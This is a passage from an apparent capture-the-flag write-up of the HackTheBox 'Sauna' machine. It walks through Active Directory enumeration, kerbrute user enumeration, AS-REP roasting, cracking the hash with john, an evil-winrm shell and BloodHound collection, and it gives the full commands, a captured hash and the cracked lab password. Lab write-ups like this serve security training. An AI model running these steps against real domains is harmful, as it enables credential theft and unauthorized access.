</span><span class="nx">masteredBy:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">NTDS</span><span class="w"> </span><span class="nx">Settings</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">SAUNA</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Servers</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Default-First-Site-Name</span><span class="p">,</span><span class="nx">CN</span><span class="w">
 </span><span class="o">=</span><span class="n">Sites</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="nx">ms-DS-MachineAccountQuota:</span><span class="w"> </span><span class="nx">10</span><span class="w">
</span><span class="n">msDS-Behavior-Version:</span><span class="w"> </span><span class="nx">7</span><span class="w">
</span><span class="n">msDS-PerUserTrustQuota:</span><span class="w"> </span><span class="nx">1</span><span class="w">
</span><span class="n">msDS-AllUsersTrustQuota:</span><span class="w"> </span><span class="nx">1000</span><span class="w">
</span><span class="n">msDS-PerUserTrustTombstonesQuota:</span><span class="w"> </span><span class="nx">10</span><span class="w">
</span><span class="n">msDs-masteredBy:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">NTDS</span><span class="w"> </span><span class="nx">Settings</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">SAUNA</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Servers</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Default-First-Site-Na</span><span class="w">
 </span><span class="nx">me</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Sites</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="nx">msDS-IsDomainFor:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">NTDS</span><span class="w"> </span><span class="nx">Settings</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">SAUNA</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Servers</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Default-First-Site-N</span><span class="w">
 </span><span class="nx">ame</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Sites</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="nx">msDS-NcType:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">msDS-ExpirePasswordsOnSmartCardOnlyAccounts:</span><span class="w"> </span><span class="nx">TRUE</span><span class="w">
</span><span class="n">dc:</span><span class="w"> </span><span class="nx">EGOTISTICAL-BANK</span><span class="w">

</span><span class="c"># Users, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># Computers, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Computers</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># Domain Controllers, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">OU</span><span class="o">=</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Controllers</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># System, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">System</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># LostAndFound, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">LostAndFound</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># Infrastructure, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Infrastructure</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">ForeignSecurityPrincipals</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># Program Data, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Program</span><span class="w"> </span><span class="nx">Data</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># NTDS Quotas, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">NTDS</span><span class="w"> </span><span class="nx">Quotas</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># Managed Service Accounts, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Managed</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Accounts</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># Keys, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Keys</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># TPM Devices, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">TPM</span><span class="w"> </span><span class="nx">Devices</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># Builtin, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Builtin</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># Hugo Smith, EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Hugo</span><span class="w"> </span><span class="nx">Smith</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># search reference</span><span class="w">
</span><span class="n">ref:</span><span class="w"> </span><span class="nx">ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC</span><span class="o">=</span><span class="n">ForestDnsZones</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTIST</span><span class="w">
 </span><span class="nx">ICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># search reference</span><span class="w">
</span><span class="n">ref:</span><span class="w"> </span><span class="nx">ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC</span><span class="o">=</span><span class="n">DomainDnsZones</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTIST</span><span class="w">
 </span><span class="nx">ICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">

</span><span class="c"># search reference</span><span class="w">
</span><span class="n">ref:</span><span class="w"> </span><span class="nx">ldap://EGOTISTICAL-BANK.LOCAL/CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOC</span><span class="w">
 </span><span class="nx">AL</span><span class="w">

</span><span class="c"># search result</span><span class="w">
</span><span class="n">search:</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span><span class="n">result:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">Success</span><span class="w">

</span><span class="c"># numResponses: 19</span><span class="w">
</span><span class="c"># numEntries: 15</span><span class="w">
</span><span class="c"># numReferences: 3</span><span class="w">
</span></pre></table></code></div></div><p>I noticed a username as <code class="language-plaintext highlighter-rouge">Hugo Smith</code> so lets move further and run kerbrute to userenum the usernames I used a wordlist of usernames <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</code>.</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/Downloads/HTB/Sauna]
‚îî‚îÄ<span class="nv">$ </span>kerbrute userenum <span class="nt">-d</span> EGOTISTICAL-BANK.LOCAL <span class="nt">--dc</span> EGOTISTICAL-BANK.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 01/20/24 - Ronnie Flathers @ropnop

2024/01/20 13:38:57 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/01/20 13:38:57 <span class="o">&gt;</span>  	EGOTISTICAL-BANK.LOCAL:88

2024/01/20 13:39:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 administrator@EGOTISTICAL-BANK.LOCAL
2024/01/20 13:41:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 hsmith@EGOTISTICAL-BANK.LOCAL
2024/01/20 13:41:38 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@EGOTISTICAL-BANK.LOCAL
2024/01/20 13:42:44 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL
</pre></table></code></div></div><p>I got this usernames <code class="language-plaintext highlighter-rouge">hsmith</code> and <code class="language-plaintext highlighter-rouge">fsmith</code> , so lets look for <strong><code class="language-plaintext highlighter-rouge">AS-REP Roasting</code></strong> through <code class="language-plaintext highlighter-rouge">GETNPUsers.py</code> Tool.</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/Downloads/HTB/Sauna]
‚îî‚îÄ<span class="nv">$ </span>GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> username.txt <span class="nt">-request</span> 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span>-] User hsmith doesnt have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:6e8a4d1c1806a981eb842a6278462d2c<span class="nv">$9f760b243962dfa42eff1a4071b4b8909ef8b417110c1faec7d3f81ff2e3cf5ad51baa117419ee7368763ebccf74c27055a69f90199e401fecde7eda418d2c17e1cba21a07a681590e12f9b2fe45a9d7e31ca5b9efde72851fe7b0cb2eb4fb129756794c905e31f44df6f43d32befbca0c755297ddc75583e401dbfa122e47286c95e0d76e73ae2c43d491ddb4481aa945afedf3b057e7135c4bfa4c3c6c3c2c4fe321ed6c8ecc5558ea137c52e2756a201e9026c07e48c3cf302bac6a29ef8a5f37c15051145b365e6bee79ae31bd4dbc15def5d7d4f3097b3f0faa6da9a5f6a1d795590f6820eb1b2a0a1fdbdd1f1d0ddbf6cf397a1b075ceef443c8b786d5</span>
<span class="o">[</span>-] User administrator does not have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] invalid principal syntax
</pre></table></code></div></div><p>Lets check this hash with john ‚Üí</p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/Downloads/HTB/Sauna</span><span class="p">]</span><span class="w">
</span><span class="err">‚îî‚îÄ$</span><span class="w"> </span><span class="n">john</span><span class="w"> </span><span class="nt">--wordlist</span><span class="o">=</span><span class="n">/usr/share/wordlists/rockyou.txt</span><span class="w"> </span><span class="nx">hashes.txt</span><span class="w">                     
</span><span class="n">Using</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">encoding</span><span class="p">:</span><span class="w"> </span><span class="n">UTF</span><span class="nt">-8</span><span class="w">
</span><span class="n">Loaded</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="p">(</span><span class="n">krb5asrep</span><span class="p">,</span><span class="w"> </span><span class="n">Kerberos</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">AS</span><span class="nt">-REP</span><span class="w"> </span><span class="n">etype</span><span class="w"> </span><span class="mi">17</span><span class="n">/18/23</span><span class="w"> </span><span class="p">[</span><span class="n">MD4</span><span class="w"> </span><span class="n">HMAC</span><span class="nt">-MD5</span><span class="w"> </span><span class="n">RC4</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">PBKDF2</span><span class="w"> </span><span class="nx">HMAC-SHA1</span><span class="w"> </span><span class="nx">AES</span><span class="w"> </span><span class="nx">128/128</span><span class="w"> </span><span class="nx">SSE2</span><span class="w"> </span><span class="nx">4x</span><span class="p">])</span><span class="w">
</span><span class="n">Will</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">OpenMP</span><span class="w"> </span><span class="n">threads</span><span class="w">
</span><span class="n">Press</span><span class="w"> </span><span class="s1">'q'</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">Ctrl</span><span class="nt">-C</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">abort</span><span class="p">,</span><span class="w"> </span><span class="n">almost</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">status</span><span class="w">
</span><span class="n">Thestrokes23</span><span class="w">     </span><span class="p">(</span><span class="nv">$krb5asrep$fsmith</span><span class="err">@</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="o">.</span><span class="nf">LOCAL</span><span class="p">)</span><span class="w">     
</span><span class="mi">1</span><span class="n">g</span><span class="w"> </span><span class="nx">0:00:00:15</span><span class="w"> </span><span class="nx">DONE</span><span class="w"> </span><span class="p">(</span><span class="mi">2024</span><span class="nt">-01-20</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">55</span><span class="p">)</span><span class="w"> </span><span class="mf">0.06472</span><span class="n">g/s</span><span class="w"> </span><span class="nx">682119p/s</span><span class="w"> </span><span class="nx">682119c/s</span><span class="w"> </span><span class="nx">682119C/s</span><span class="w"> </span><span class="nx">Thing..Thereisnospoon</span><span class="w">
</span><span class="n">Use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="s2">"--show"</span><span class="w"> </span><span class="n">option</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">display</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">cracked</span><span class="w"> </span><span class="n">passwords</span><span class="w"> </span><span class="n">reliably</span><span class="w">
</span><span class="n">Session</span><span class="w"> </span><span class="n">completed.</span><span class="w">
</span></pre></table></code></div></div><p>I have the password now ‚Üí</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>fsmith : Thestrokes23
</pre></table></code></div></div><h3 id="winrm-session-Ô∏è"><span class="me-2">WinRM Session ‚§µÔ∏è</span><a href="#winrm-session-Ô∏è" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Lets see what access do this user have ‚Üí</p><p><a href="/Vulnhub-Files/img/Sauna/Untitled.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Sauna/Untitled.png" alt="Untitled" loading="lazy"></a></p><p>Lets have a shell now ‚Üí</p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">/usr/share/wordlists/dirb/others</span><span class="p">]</span><span class="w">
</span><span class="err">‚îî‚îÄ$</span><span class="w"> </span><span class="n">evil</span><span class="nt">-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">175</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="n">fsmith</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="n">Thestrokes23</span><span class="w">
                                        
</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">v3.</span><span class="mi">5</span><span class="w">
                                        
</span><span class="n">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">completions</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">disabled</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">ruby</span><span class="w"> </span><span class="n">limitation</span><span class="p">:</span><span class="w"> </span><span class="n">quoting_detection_proc</span><span class="p">()</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">unimplemented</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">machine</span><span class="w">
                                        
</span><span class="n">Data</span><span class="p">:</span><span class="w"> </span><span class="n">For</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">information</span><span class="p">,</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">GitHub</span><span class="p">:</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="n">//github.com/Hackplayers/evil-winrm</span><span class="c">#Remote-path-completion</span><span class="w">
                                        
</span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Establishing</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">endpoint</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\FSmith\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="n">egotisticalbank\fsmith</span><span class="w">
</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\FSmith\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">hostname</span><span class="w">
</span><span class="n">SAUNA</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\FSmith\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="o">..</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\FSmith</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">tree</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">/a</span><span class="w">
</span><span class="n">Folder</span><span class="w"> </span><span class="n">PATH</span><span class="w"> </span><span class="n">listing</span><span class="w">
</span><span class="n">Volume</span><span class="w"> </span><span class="n">serial</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="mi">489</span><span class="n">C-D8FC</span><span class="w">
</span><span class="nx">C:.</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Desktop</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">user.txt</span><span class="w">
</span><span class="o">|</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Documents</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Downloads</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Favorites</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Links</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Music</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Pictures</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Saved</span><span class="w"> </span><span class="n">Games</span><span class="w">
</span><span class="n">\---Videos</span><span class="w">
</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\FSmith</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>Now I collected the Informations for BloodHound .</p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/Downloads/HTB/Sauna</span><span class="p">]</span><span class="w">
</span><span class="err">‚îî‚îÄ$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">/opt/Tools/BloodHound.py/bloodhound.py</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s1">'EGOTISTICAL-BANK.LOCAL'</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">fsmith</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">'Thestrokes23'</span><span class="w"> </span><span class="nt">-ns</span><span class="w"> </span><span class="nx">10.10.10.175</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="n">AD</span><span class="w"> </span><span class="n">domain</span><span class="p">:</span><span class="w"> </span><span class="n">egotistical</span><span class="nt">-bank</span><span class="o">.</span><span class="nf">local</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Getting</span><span class="w"> </span><span class="n">TGT</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">user</span><span class="w">
</span><span class="n">WARNING</span><span class="p">:</span><span class="w"> </span><span class="n">Failed</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">Kerberos</span><span class="w"> </span><span class="n">TGT.</span><span class="w"> </span><span class="n">Falling</span><span class="w"> </span><span class="n">back</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">NTLM</span><span class="w"> </span><span class="n">authentication.</span><span class="w"> </span><span class="n">Error</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="n">Errno</span><span class="w"> </span><span class="n">Connection</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="p">(</span><span class="n">SAUNA.EGOTISTICAL</span><span class="nt">-BANK</span><span class="o">.</span><span class="nf">LOCAL</span><span class="p">:</span><span class="mi">88</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="n">Errno</span><span class="w"> </span><span class="nt">-2</span><span class="p">]</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">known</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Connecting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">LDAP</span><span class="w"> </span><span class="n">server</span><span class="p">:</span><span class="w"> </span><span class="n">SAUNA.EGOTISTICAL</span><span class="nt">-BANK</span><span class="o">.</span><span class="nf">LOCAL</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">domains</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">domains</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">forest</span><span class="w">
